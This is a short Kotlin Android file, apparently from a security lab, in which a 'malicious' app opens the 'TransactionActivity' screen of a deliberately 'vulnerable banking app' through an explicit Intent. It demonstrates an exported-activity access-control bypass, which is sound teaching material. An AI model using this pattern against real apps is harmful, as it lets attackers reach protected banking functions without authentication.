package com.example.maliciousapplication

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity

class ActivityAccessActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_activity_access)
    }

    fun buttonActivityAccessOnclick(view: View) {
        val intent = Intent()
        intent.component = ComponentName("com.example.vulnerablebankingapp",
                "com.example.vulnerablebankingapp.TransactionActivity")
        startActivity(intent)
        finish()
    }
}